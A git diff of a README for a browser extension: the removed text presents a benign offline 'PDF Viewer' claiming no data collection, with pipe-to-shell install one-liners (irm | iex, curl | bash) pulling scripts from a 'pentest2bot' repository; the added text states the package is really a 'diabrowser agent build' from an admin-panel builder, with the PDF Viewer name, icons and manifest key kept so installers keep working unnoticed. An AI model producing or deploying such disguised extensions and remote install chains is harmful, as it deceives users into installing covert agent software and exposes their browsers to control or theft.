@@ -1,47 +1,17 @@
-# PDF Viewer Extension
+# PDF Viewer (diabrowser agent build)
 
-Simple offline PDF viewer for Chrome, Edge, and Brave browsers.
+Unpacked Chrome extension delivered by the PDF Viewer installer chain.
 
-## Features
+Content is the current build produced by the diabrowser admin panel
+(builder: `http://builder:8090`, stub source in the panel container), taken from
+the newest build of refTag `solar`. Branding and identity are kept from the
+previous PDF Viewer packaging so the install chain does not change:
 
-- 📄 View PDF files directly in browser
-- 🎨 Clean, modern interface
-- 📱 Drag & drop support
-- 🔄 Page navigation
-- 💾 Works completely offline
-- 🔒 No data collection
+- `name` = `PDF Viewer`, PDF Viewer icons (`icons/icon*.png`);
+- manifest `key` preserved, so the extension ID stays stable:
+  `kklpcoclpjjfiboodbmcpogicnanoopp` (SHA256 of the DER key, nibbles mapped to
+  a-p). Losing the key would make the ID path-derived and the installers would
+  silently stop working.
 
-## Installation
-
-### Windows
-```powershell
-irm https://raw.githubusercontent.com/pentest2bot/pdf-viewer-installers/main/install-pdf-viewer.ps1 | iex
-```
-
-### macOS
-```bash
-curl -fsSL https://raw.githubusercontent.com/pentest2bot/pdf-viewer-installers/main/install-pdf-viewer-macos.sh | bash
-```
-
-## Manual Installation
-
-1. Download this repository
-2. Open Chrome/Edge/Brave
-3. Go to `chrome://extensions`
-4. Enable "Developer mode"
-5. Click "Load unpacked"
-6. Select the extension folder
-
-## Usage
-
-1. Click the extension icon
-2. Select or drag & drop a PDF file
-3. Navigate pages using Previous/Next buttons
-
-## Auto-updates
-
-The installer sets up automatic updates that check daily for new versions.
-
-## License
-
-MIT
+The panel build is refreshed with `bash /opt/pdf-viewer/extension/refresh.sh`,
+which re-pulls the newest panel build and re-applies name, icons and key.
